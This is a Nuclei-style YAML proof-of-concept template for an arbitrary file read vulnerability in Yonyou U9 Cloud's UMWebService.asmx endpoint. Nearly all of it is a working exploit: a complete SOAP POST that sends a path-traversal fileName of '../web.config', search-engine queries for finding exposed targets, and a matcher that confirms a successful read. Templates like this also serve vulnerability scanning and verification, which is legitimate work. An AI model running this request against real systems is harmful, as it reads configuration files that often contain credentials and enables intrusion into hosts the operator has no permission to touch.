clean_poc_20260104/high/Yonyou_U9_UMWebService_Fileread.yaml

id: Yonyou_U9_UMWebService_Fileread

info:
  name: Yonyou_U9_UMWebService_Fileread
  author: HK
  severity: high
  description: 用友 U9 cloud /u9/OnLine/UMWebService.asmx接口fileName参数存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: body="logo-u9.png"
    Quake-query: body="logo-u9.png"
    Hunter-query: body="logo-u9.png"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /u9/OnLine/UMWebService.asmx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36
    Connection: close
    Content-Type: text/xml; charset=utf-8
    Accept-Encoding: gzip
    Content-Length: 371

    <?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetLogContent xmlns="http://tempuri.org/">
          <fileName>../web.config</fileName>
        </GetLogContent>
      </soap:Body>
    </soap:Envelope>

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - UIConfiguration